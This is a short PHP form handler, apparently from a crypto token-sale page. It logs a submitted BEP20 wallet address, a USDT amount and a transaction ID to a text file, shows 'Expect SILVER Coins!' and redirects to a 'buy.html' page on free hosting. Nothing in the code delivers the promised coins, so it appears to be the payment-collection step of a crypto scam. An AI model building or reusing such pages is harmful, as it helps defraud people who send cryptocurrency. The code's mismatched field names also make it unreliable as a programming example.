<?php





header( 'Refresh:10;http://v92366nc.beget.tech/buy.html');
echo '    
<h1>Successfully!Expect SILVER Coins!</h1>';

$name = $_POST['name'];
$surname = $_POST['surname'];
$number= $_POST['number'];
$file = fopen("1.txt","at");
fwrite($file,"BSC Wallet (BEP20): $name \n
USDT: $surname \n
TxID:
$number
\n ");
fclose($file);

exit;







	
















?>